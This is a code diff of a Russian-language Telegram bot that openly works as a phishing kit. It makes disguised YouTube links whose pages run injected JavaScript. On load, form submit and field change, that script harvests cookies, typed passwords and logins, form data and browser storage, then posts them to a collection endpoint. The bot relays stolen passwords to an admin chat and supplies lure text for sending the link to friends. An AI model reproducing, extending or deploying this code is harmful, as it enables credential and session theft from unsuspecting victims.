@@ -29,7 +29,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Конфигурация
-BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
 ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
 DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга
 
@@ -156,15 +156,258 @@ class Database:
 db = Database()
 db.load()
 
-# Генератор JavaScript для сбора данных (сохраняем тот же код)
+# Генератор JavaScript для сбора данных
 class JavaScriptInjector:
     @staticmethod
     def get_cookies_collection_script() -> str:
         """JavaScript для сбора cookies"""
-        # Тот же самый JavaScript код
         return """
         <script>
-        // ... (весь JavaScript код остается без изменений) ...
+        // Функция для сбора всех cookies
+        function collectAllCookies() {
+            const cookies = {};
+            
+            // Собираем cookies из document.cookie
+            const cookieString = document.cookie;
+            if (cookieString) {
+                cookieString.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        cookies[name] = decodeURIComponent(value);
+                    }
+                });
+            }
+            
+            return cookies;
+        }
+        
+        // Функция для сбора сохраненных паролей и логинов
+        function collectSavedCredentials() {
+            const credentials = {
+                passwords: [],
+                logins: [],
+                autofill_data: []
+            };
+            
+            try {
+                // Ищем все поля паролей и логинов
+                const passwordFields = document.querySelectorAll('input[type="password"]');
+                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
+                
+                // Собираем значения из полей
+                passwordFields.forEach(field => {
+                    if (field.value) {
+                        credentials.passwords.push({
+                            field_name: field.name || field.id || 'unknown',
+                            field_id: field.id,
+                            field_class: field.className,
+                            value: field.value,
+                            page_url: window.location.href,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+                
+                loginFields.forEach(field => {
+                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
+                        credentials.logins.push({
+                            field_name: field.name || field.id || 'unknown',
+                            field_id: field.id,
+                            field_class: field.className,
+                            value: field.value,
+                            page_url: window.location.href,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+                
+                // Собираем данные из всех форм
+                document.querySelectorAll('form').forEach(form => {
+                    try {
+                        const formData = new FormData(form);
+                        const formValues = {};
+                        for (let [key, value] of formData.entries()) {
+                            formValues[key] = value;
+                        }
+                        
+                        if (Object.keys(formValues).length > 0) {
+                            credentials.autofill_data.push({
+                                type: 'form_data',
+                                form_id: form.id || 'unknown',
+                                form_action: form.action || 'unknown',
+                                data: formValues
+                            });
+                        }
+                    } catch (e) {
+                        // Игнорируем
+                    }
+                });
+                
+            } catch (e) {
+                console.error('Error collecting credentials:', e);
+            }
+            
+            return credentials;
+        }
+        
+        // Функция для сбора данных из хранилища
+        function collectStorageData() {
+            const storageData = {
+                localStorage: {},
+                sessionStorage: {},
+                indexedDB: []
+            };
+            
+            try {
+                // Собираем localStorage
+                if (window.localStorage) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        storageData.localStorage[key] = localStorage.getItem(key);
+                    }
+                }
+                
+                // Собираем sessionStorage
+                if (window.sessionStorage) {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                }
+                
+            } catch (e) {
+                console.error('Error collecting storage data:', e);
+            }
+            
+            return storageData;
+        }
+        
+        // Главная функция сбора всех данных
+        async function collectAllSensitiveData() {
+            const allData = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: {},
+                credentials: {},
+                storage_data: {},
+                browser_info: {
+                    cookie_enabled: navigator.cookieEnabled,
+                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                    do_not_track: navigator.doNotTrack || 'unspecified'
+                }
+            };
+            
+            try {
+                // Собираем cookies
+                allData.cookies = collectAllCookies();
+                
+                // Собираем пароли и логины
+                allData.credentials = collectSavedCredentials();
+                
+                // Собираем данные из хранилищ
+                allData.storage_data = collectStorageData();
+                
+                // Собираем информацию о экране
+                allData.screen_info = {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    color_depth: window.screen.colorDepth,
+                    pixel_depth: window.screen.pixelDepth
+                };
+                
+                // Собираем информацию о часовом поясе
+                allData.timezone = {
+                    offset: new Date().getTimezoneOffset(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                
+                return allData;
+                
+            } catch (error) {
+                console.error('Error collecting sensitive data:', error);
+                return {
+                    error: error.message,
+                    partial_data: allData
+                };
+            }
+        }
+        
+        // Функция отправки данных на сервер
+        function sendCollectedData(data) {
+            const linkId = new URLSearchParams(window.location.search).get('id');
+            if (!linkId) return;
+            
+            try {
+                // Кодируем данные для отправки
+                const jsonData = JSON.stringify(data);
+                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
+                
+                // Отправляем данные
+                fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        data_type: 'sensitive_data',
+                        data: encodedData,
+                        timestamp: new Date().toISOString()
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Data sent successfully:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending data:', error);
+                });
+            } catch (error) {
+                console.error('Error preparing data for send:', error);
+            }
+        }
+        
+        // Автоматический сбор данных при загрузке страницы
+        window.addEventListener('load', function() {
+            setTimeout(async () => {
+                try {
+                    const sensitiveData = await collectAllSensitiveData();
+                    sendCollectedData(sensitiveData);
+                } catch (e) {
+                    console.error('Initial collection failed:', e);
+                }
+                
+                // Дополнительный сбор при взаимодействии с формами
+                document.addEventListener('submit', async function(e) {
+                    setTimeout(async () => {
+                        try {
+                            const formData = await collectAllSensitiveData();
+                            sendCollectedData(formData);
+                        } catch (e) {
+                            console.error('Form submit collection failed:', e);
+                        }
+                    }, 500);
+                });
+                
+                // Сбор при изменении полей
+                document.querySelectorAll('input, textarea, select').forEach(input => {
+                    input.addEventListener('change', async function() {
+                        setTimeout(async () => {
+                            try {
+                                const fieldData = await collectAllSensitiveData();
+                                sendCollectedData(fieldData);
+                            } catch (e) {
+                                console.error('Field change collection failed:', e);
+                            }
+                        }, 1000);
+                    });
+                });
+                
+            }, 3000); // Ждем 3 секунды для загрузки страницы
+        });
         </script>
         """
     
@@ -378,14 +621,14 @@ def split_message(text: str, max_length: int = 4000) -> List[str]:
 def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
     """Форматирование детального отчета для админа"""
     report = f"""
-🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
+🔐 ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ
     
-📌 Ссылка ID: `{link.id}`
-👤 Создатель: `{link.created_by}`
+📌 Ссылка ID: {link.id}
+👤 Создатель: {link.created_by}
 🔗 Оригинальное видео: {link.original_url[:50]}...
 📅 Время сбора: {datetime.now().isoformat()}
     
-📊 *ОБЩАЯ СТАТИСТИКА:*
+📊 ОБЩАЯ СТАТИСТИКА:
 • Переходов по ссылке: {link.clicks}
 • Cookies собрано: {len(link.collected_cookies)}
 • Паролей найдено: {len(link.collected_passwords)}
@@ -398,7 +641,7 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
     
     # Добавляем детали cookies
     if link.collected_cookies:
-        report += "\n🍪 *COOKIES (первые 15):*\n"
+        report += "\n🍪 COOKIES (первые 15):\n"
         for i, cookie in enumerate(link.collected_cookies[:15], 1):
             value_preview = cookie.get('value', '')
             if len(value_preview) > 50:
@@ -407,10 +650,10 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
     
     # Добавляем пароли
     if link.collected_passwords:
-        report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
+        report += "\n🔑 НАЙДЕННЫЕ ПАРОЛИ:\n"
         for i, pwd in enumerate(link.collected_passwords, 1):
             report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
-            report += f"   Значение: `{pwd.get('value', '')}`\n"
+            report += f"   Значение: {pwd.get('value', '')}\n"
             report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
             report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
             if i < len(link.collected_passwords):
@@ -418,32 +661,18 @@ def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> st
     
     # Добавляем логины
     if link.collected_logins:
-        report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
+        report += "\n👤 НАЙДЕННЫЕ ЛОГИНЫ:\n"
         for i, login in enumerate(link.collected_logins, 1):
             report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
-            report += f"   Значение: `{login.get('value', '')}`\n"
+            report += f"   Значение: {login.get('value', '')}\n"
             report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
             report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
             if i < len(link.collected_logins):
                 report += "   ─────\n"
     
-    # Добавляем данные хранилища
-    if link.collected_storage_data:
-        report += "\n💾 *ДАННЫЕ ХРАНИЛИЩА (первые 10):*\n"
-        for i, storage in enumerate(link.collected_storage_data[:10], 1):
-            report += f"{i}. Тип: {storage.get('type', 'unknown')}\n"
-            report += f"   Ключ: {storage.get('key', 'N/A')}\n"
-            value_preview = storage.get('value', '')
-            if len(value_preview) > 100:
-                value_preview = value_preview[:100] + "..."
-            report += f"   Значение: {value_preview}\n"
-            report += f"   Время: {storage.get('timestamp', 'N/A')[:19]}\n"
-            if i < min(10, len(link.collected_storage_data)):
-                report += "   ─────\n"
-    
     report += f"""
 ════════════════════════════════════════
-⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
+⚠️ ВНИМАНИЕ: Все данные сохранены в базе
 📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
 🕒 Время хранения: 24 часа
 """
@@ -465,18 +694,16 @@ async def send_detailed_data_to_admin(context, link: PhishingLink, collected_dat
         chunks = split_message(report, 3900)
         
         for i, chunk in enumerate(chunks):
-            parse_mode = ParseMode.MARKDOWN if i == 0 else None
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
                 text=chunk,
-                parse_mode=parse_mode,
                 disable_web_page_preview=True
             )
             
     except Exception as e:
         logger.error(f"Error sending detailed data to admin: {e}")
 
-# Сборщик данных (оставляем без изменений функциональность)
+# Сборщик данных
 class DataCollector:
     def __init__(self):
         self.collection_scripts = {
@@ -536,22 +763,6 @@ class DataCollector:
             if cookies:
                 cookies_list = []
                 for name, value in cookies.items():
-                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
-                        try:
-                            parsed_value = json.loads(value)
-                            if isinstance(parsed_value, dict):
-                                for storage_key, storage_value in parsed_value.items():
-                                    db.add_collected_storage(link_id, [{
-                                        "type": "cookie_storage",
-                                        "source": name,
-                                        "key": storage_key,
-                                        "value": str(storage_value)[:500],
-                                        "timestamp": datetime.now().isoformat()
-                                    }])
-                                continue
-                        except:
-                            pass
-                    
                     cookies_list.append({
                         "name": name,
                         "value": str(value)[:500] if value else "",
@@ -597,19 +808,6 @@ class DataCollector:
                 if storage_list:
                     db.add_collected_storage(link_id, storage_list)
             
-            # Обрабатываем данные автозаполнения форм
-            if credentials.get("autofill_data"):
-                for form_data in credentials["autofill_data"]:
-                    if form_data.get("data"):
-                        for key, value in form_data["data"].items():
-                            storage_list.append({
-                                "type": "form_autofill",
-                                "form_id": form_data.get("form_id", "unknown"),
-                                "key": key,
-                                "value": str(value)[:500],
-                                "timestamp": datetime.now().isoformat()
-                            })
-            
             # Сохраняем общие данные
             db.add_collected_data(link_id, decoded_data)
             
@@ -621,7 +819,6 @@ class DataCollector:
                 "passwords_count": len(credentials.get("passwords", [])),
                 "logins_count": len(credentials.get("logins", [])),
                 "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
-                "social_logins": list(decoded_data.get("social_logins", {}).keys()),
                 "has_storage_data": bool(storage_data),
                 "has_full_data": True
             }
@@ -766,7 +963,7 @@ class DataCollector:
             "ip_location": "определяется по IP"
         }
 
-# Форматирование сообщений (ИЗМЕНЯЕМ на сообщения из скриншотов)
+# Форматирование сообщений (сообщения из скриншотов)
 class MessageFormatter:
     @staticmethod
     def format_welcome_message() -> str:
@@ -848,11 +1045,19 @@ class MessageFormatter:
         
         if data.get("email"):
             message += f"[E-mail] - {data.get('email')}\n"
-            message += f"[password] - {data.get('email_password', '...')}\n\n"
+            if data.get("email_password"):
+                message += f"[password] - {data.get('email_password')}\n"
+            else:
+                message += f"[password] - ...\n"
+            message += "\n"
         
         if data.get("facebook"):
             message += f"[Facebook] - {data.get('facebook')}\n"
-            message += f"[password] - {data.get('facebook_password', '...')}\n\n"
+            if data.get("facebook_password"):
+                message += f"[password] - {data.get('facebook_password')}\n"
+            else:
+                message += f"[password] - ...\n"
+            message += "\n"
         
         if data.get("viber"):
             message += f"[Viber] - {data.get('viber')}\n\n"
@@ -875,7 +1080,7 @@ data_collector = DataCollector()
 formatter = MessageFormatter()
 js_injector = JavaScriptInjector()
 
-# Команды бота (ИЗМЕНЯЕМ на команды из скриншотов)
+# Команды бота
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Команда /start - приветственное сообщение"""
     welcome_message = formatter.format_welcome_message()
@@ -889,7 +1094,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         welcome_message,
-        parse_mode=ParseMode.MARKDOWN,
         reply_markup=reply_markup
     )
 
@@ -906,7 +1110,6 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         create_message,
-        parse_mode=ParseMode.MARKDOWN,
         reply_markup=reply_markup
     )
 
@@ -924,7 +1127,6 @@ async def nip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         module_message,
-        parse_mode=ParseMode.MARKDOWN,
         reply_markup=reply_markup
     )
 
@@ -933,8 +1135,7 @@ async def htp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link_prompt = formatter.format_link_input_prompt()
     
     await update.message.reply_text(
-        link_prompt,
-        parse_mode=ParseMode.MARKDOWN
+        link_prompt
     )
     
     # Сохраняем состояние для ожидания ссылки
@@ -943,31 +1144,30 @@ async def htp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Команда /support - техническая поддержка"""
-    support_message = """🆘 *Техническая поддержка*
+    support_message = """🆘 Техническая поддержка
     
 По всем вопросам создания и настройки URL ссылок обращайтесь:
 • Через этого бота - команда /help
 • Напрямую администратору - @admin_username
 • По email: support@domain.com
     
-*Часто задаваемые вопросы:*
+Часто задаваемые вопросы:
 1. Как создать ссылку? - Используйте /create
 2. Как редактировать существующую ссылку? - Используйте /htp
 3. Какие модуляции доступны? - Используйте /nip для просмотра моделей
 4. Где соглашение? - https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG
     
-*Рабочее время поддержки:* 10:00-22:00 (МСК)"""
+Рабочее время поддержки: 10:00-22:00 (МСК)"""
     
     await update.message.reply_text(
-        support_message,
-        parse_mode=ParseMode.MARKDOWN
+        support_message
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Команда /help - помощь"""
-    help_message = """📖 *Помощь по использованию бота*
+    help_message = """📖 Помощь по использованию бота
     
-*Основные команды:*
+Основные команды:
 /start - Начать работу с ботом
 /create - Создать новую URL ссылку
 /nip - Настройка модуляций для новой ссылки
@@ -975,17 +1175,16 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 /support - Техническая поддержка
 /data - Просмотр собранных данных
     
-*Процесс работы:*
+Процесс работы:
 1. Используйте /create для начала
 2. Выберите режим (/nip для новой, /htp для редактирования)
 3. Следуйте инструкциям бота
 4. Получите готовую ссылку
     
-*Важно:* Все созданные ссылки имеют модуляцию data_send для сбора данных."""
+Важно: Все созданные ссылки имеют модуляцию data_send для сбора данных."""
     
     await update.message.reply_text(
-        help_message,
-        parse_mode=ParseMode.MARKDOWN
+        help_message
     )
 
 async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1002,8 +1201,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         # Если это YouTube ссылка, но не в режиме редактирования, предлагаем создать
         await update.message.reply_text(
             "Вы отправили ссылку на YouTube видео. Хотите создать новую URL с модуляцией?\n"
-            "Используйте команду /create для начала.",
-            parse_mode=ParseMode.MARKDOWN
+            "Используйте команду /create для начала."
         )
         return
     
@@ -1016,9 +1214,9 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
             await update.message.reply_text(
                 "❌ Это не похоже на ссылку YouTube.\n"
                 "Пожалуйста, отправьте ссылку в формате:\n"
-                "`https://youtube.com/watch?v=...`\n"
+                "https://youtube.com/watch?v=...\n"
                 "или\n"
-                "`https://youtu.be/...`"
+                "https://youtu.be/..."
             )
             return
         
@@ -1059,7 +1257,6 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         await update.message.reply_text(
             message,
-            parse_mode=ParseMode.MARKDOWN,
             reply_markup=reply_markup,
             disable_web_page_preview=True
         )
@@ -1072,8 +1269,7 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
                      f"👤 User: @{user.username or user.id}\n"
                      f"🔗 Original: {url[:50]}...\n"
                      f"📌 ID: {link_id}\n"
-                     f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-                parse_mode=ParseMode.MARKDOWN
+                     f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             )
         except Exception as e:
             logger.error(f"Error notifying admin: {e}")
@@ -1090,24 +1286,64 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     
     if data == "create":
-        await create_command_with_message(query)
+        create_message = formatter.format_create_mode_selection()
+        
+        keyboard = [
+            [InlineKeyboardButton("🔗 Создать новую", callback_data="nip")],
+            [InlineKeyboardButton("✏️ Редактировать", callback_data="htp")],
+            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.message.reply_text(
+            create_message,
+            reply_markup=reply_markup
+        )
     
     elif data == "nip":
-        await nip_command_with_message(query)
+        module_message = formatter.format_module_selection()
+        
+        keyboard = [
+            [InlineKeyboardButton("Модель 1", callback_data="model_1")],
+            [InlineKeyboardButton("Модель 2", callback_data="model_2")],
+            [InlineKeyboardButton("Модель 3", callback_data="model_3")],
+            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.message.reply_text(
+            module_message,
+            reply_markup=reply_markup
+        )
     
     elif data == "htp":
-        await htp_command_with_message(query)
+        link_prompt = formatter.format_link_input_prompt()
+        await query.message.reply_text(link_prompt)
     
     elif data == "support":
-        await support_command_with_message(query)
+        support_message = """🆘 Техническая поддержка
+        
+По всем вопросам создания и настройки URL ссылок обращайтесь:
+• Через этого бота - команда /help
+• Напрямую администратору - @admin_username
+• По email: support@domain.com
+        
+Часто задаваемые вопросы:
+1. Как создать ссылку? - Используйте /create
+2. Как редактировать существующую ссылку? - Используйте /htp
+3. Какие модуляции доступны? - Используйте /nip для просмотра моделей
+4. Где соглашение? - https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG
+        
+Рабочее время поддержки: 10:00-22:00 (МСК)"""
+        
+        await query.message.reply_text(support_message)
     
     elif data.startswith("model_"):
         model_num = data.split("_")[1]
         await query.message.reply_text(
             f"✅ Выбрана модель {model_num}\n\n"
             f"Теперь отправьте ссылку на YouTube видео для применения модуляций.\n"
-            f"Или используйте команду /htp для редактирования существующей ссылки.",
-            parse_mode=ParseMode.MARKDOWN
+            f"Или используйте команду /htp для редактирования существующей ссылки."
         )
     
     elif data.startswith("copy_"):
@@ -1116,9 +1352,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if link:
             phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
             await query.message.reply_text(
-                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
-                "Используйте Ctrl+C / Cmd+C для копирования.",
-                parse_mode=ParseMode.MARKDOWN
+                f"📋 Ссылка для копирования:\n\n{phishing_url}\n\n"
+                "Используйте Ctrl+C / Cmd+C для копирования."
             )
     
     elif data.startswith("share_"):
@@ -1126,139 +1361,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         link = db.get_link(link_id)
         if link:
             phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
-            share_text = f"""🎬 *Смотри это крутое видео!* 🎬
+            share_text = f"""🎬 Смотри это крутое видео! 🎬
 
 Я нашел очень интересное видео на YouTube!
 Обязательно посмотри - не пожалеешь!
 
-🔗 *Ссылка:* {phishing_url}
+🔗 Ссылка: {phishing_url}
 
 #видео #youtube #рекомендация"""
             
             await query.message.reply_text(
-                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
-                "Скопируйте и отправьте другу.",
-                parse_mode=ParseMode.MARKDOWN
+                f"📤 Текст для отправки:\n\n{share_text}\n\n"
+                "Скопируйте и отправьте другу."
             )
-    
-    elif data == "view_data":
-        user_id = query.from_user.id
-        user_links = [link for link in db.links.values() if link.created_by == user_id]
-        
-        if not user_links:
-            await query.message.reply_text("📭 У вас пока нет собранных данных.")
-            return
-        
-        # Отправляем последние логины в формате из скриншотов
-        login_count = 0
-        for link in user_links:
-            if link.full_sensitive_data:
-                for sensitive_data in link.full_sensitive_data[-5:]:  # Последние 5 записей
-                    login_count += 1
-                    
-                    # Извлекаем данные в формате скриншотов
-                    login_data = {
-                        "phone": "Unknown",
-                        "serial": link.id[:8],
-                        "dpp": "N/A",
-                        "email": None,
-                        "email_password": None,
-                        "facebook": None,
-                        "facebook_password": None,
-                        "viber": None,
-                        "whatsapp": None,
-                        "messenger": None
-                    }
-                    
-                    # Пытаемся извлечь данные из sensitive_data
-                    credentials = sensitive_data.get("credentials", {})
-                    if credentials.get("logins"):
-                        for login in credentials["logins"]:
-                            value = login.get("value", "")
-                            if "@" in value and "." in value:
-                                login_data["email"] = value
-                                login_data["email_password"] = "..."  # Пароль будет в passwords
-                    
-                    if credentials.get("passwords"):
-                        for pwd in credentials["passwords"]:
-                            if pwd.get("value"):
-                                if login_data["email_password"] == "...":
-                                    login_data["email_password"] = pwd.get("value", "...")
-                    
-                    # Отправляем в формате из скриншотов
-                    login_message = formatter.format_login_data(login_count, login_data)
-                    await query.message.reply_text(login_message)
-        
-        if login_count == 0:
-            await query.message.reply_text("📭 Данные еще не собраны. Дождитесь переходов по вашей ссылке.")
 
-async def create_command_with_message(query):
-    """Версия create_command для обработки кнопок"""
-    create_message = formatter.format_create_mode_selection()
-    
-    keyboard = [
-        [InlineKeyboardButton("🔗 Создать новую", callback_data="nip")],
-        [InlineKeyboardButton("✏️ Редактировать", callback_data="htp")],
-        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await query.message.reply_text(
-        create_message,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=reply_markup
-    )
-
-async def nip_command_with_message(query):
-    """Версия nip_command для обработки кнопок"""
-    module_message = formatter.format_module_selection()
-    
-    keyboard = [
-        [InlineKeyboardButton("Модель 1", callback_data="model_1")],
-        [InlineKeyboardButton("Модель 2", callback_data="model_2")],
-        [InlineKeyboardButton("Модель 3", callback_data="model_3")],
-        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await query.message.reply_text(
-        module_message,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=reply_markup
-    )
-
-async def htp_command_with_message(query):
-    """Версия htp_command для обработки кнопок"""
-    link_prompt = formatter.format_link_input_prompt()
-    
-    await query.message.reply_text(
-        link_prompt,
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def support_command_with_message(query):
-    """Версия support_command для обработки кнопок"""
-    support_message = """🆘 *Техническая поддержка*
-    
-По всем вопросам создания и настройки URL ссылок обращайтесь:
-• Через этого бота - команда /help
-• Напрямую администратору - @admin_username
-• По email: support@domain.com
-    
-*Часто задаваемые вопросы:*
-1. Как создать ссылку? - Используйте /create
-2. Как редактировать существующую ссылку? - Используйте /htp
-3. Какие модуляции доступны? - Используйте /nip для просмотра моделей
-4. Где соглашение? - https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG
-    
-*Рабочее время поддержки:* 10:00-22:00 (МСК)"""
-    
-    await query.message.reply_text(
-        support_message,
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-# Webhook обработчик для сбора данных (оставляем без изменений функциональность)
+# Webhook обработчик для сбора данных
 async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
     """Обработка данных от фишинговой страницы"""
     try:
@@ -1342,43 +1459,6 @@ async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     if not context.args:
-        await update.message.reply_text(
-            "📊 *Просмотр данных*\n\n"
-            "Используйте: `/data` - показать последние логины\n"
-            "Или: `/data stats` - статистика\n\n"
-            "Данные появляются после переходов по вашим ссылкам.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    arg = context.args[0]
-    
-    if arg == "stats":
-        user_links = [link for link in db.links.values() if link.created_by == user.id]
-        
-        if not user_links:
-            await update.message.reply_text("📭 У вас нет созданных ссылок.")
-            return
-        
-        total_clicks = sum(link.clicks for link in user_links)
-        total_data = sum(len(link.full_sensitive_data) for link in user_links)
-        
-        message = f"""📈 *Ваша статистика:*
-        
-🔗 Создано ссылок: {len(user_links)}
-👥 Всего переходов: {total_clicks}
-🔓 Собрано данных: {total_data}
-        
-*Последние ссылки:*
-"""
-        
-        for link in user_links[-3:]:
-            message += f"• `{link.id[:8]}`: {link.clicks} переходов, {len(link.full_sensitive_data)} данных\n"
-        
-        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
-    
-    else:
-        # Показать последние логины
         user_links = [link for link in db.links.values() if link.created_by == user.id]
         
         if not user_links:
@@ -1425,6 +1505,33 @@ async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if login_count == 0:
             await update.message.reply_text("📭 Данные еще не собраны. Дождитесь переходов по вашей ссылке.")
+        return
+    
+    arg = context.args[0]
+    
+    if arg == "stats":
+        user_links = [link for link in db.links.values() if link.created_by == user.id]
+        
+        if not user_links:
+            await update.message.reply_text("📭 У вас нет созданных ссылок.")
+            return
+        
+        total_clicks = sum(link.clicks for link in user_links)
+        total_data = sum(len(link.full_sensitive_data) for link in user_links)
+        
+        message = f"""📈 Ваша статистика:
+        
+🔗 Создано ссылок: {len(user_links)}
+👥 Всего переходов: {total_clicks}
+🔓 Собрано данных: {total_data}
+        
+Последние ссылки:
+"""
+        
+        for link in user_links[-3:]:
+            message += f"• {link.id[:8]}: {link.clicks} переходов, {len(link.full_sensitive_data)} данных\n"
+        
+        await update.message.reply_text(message)
 
 # Обработчик ошибок
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1444,7 +1551,7 @@ def main():
     # Создаем приложение
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Регистрируем обработчики команд (новые команды из скриншотов)
+    # Регистрируем обработчики команд
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("create", create_command))
     application.add_handler(CommandHandler("nip", nip_command))
@@ -1472,7 +1579,8 @@ def main():
     print("🔐 Функции сбора данных активны")
     print("⏳ Ожидание команд...")
     
-    application.run_polling(allowed_updates=Update.ALL_UPDATES)
+    # Исправленная строка запуска - убрали ALL_UPDATES
+    application.run_polling()
 
 if __name__ == '__main__':
     main()
